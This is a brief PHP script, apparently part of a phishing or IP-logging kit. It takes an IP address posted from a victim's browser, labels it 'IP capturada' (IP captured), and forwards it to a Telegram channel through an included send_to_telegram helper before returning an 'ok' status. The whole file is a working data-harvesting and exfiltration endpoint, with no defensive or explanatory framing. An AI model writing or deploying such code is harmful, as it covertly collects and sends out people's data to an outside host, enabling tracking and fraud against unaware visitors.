<?php
require_once __DIR__ . '/telegram.php';

$ip = $_POST['ip'] ?? 'N/A';

$msg = "🌍 <b>IP capturada</b>\n".
       "📌 $ip";

send_to_telegram($msg);

echo json_encode(['status' => 'ok']);
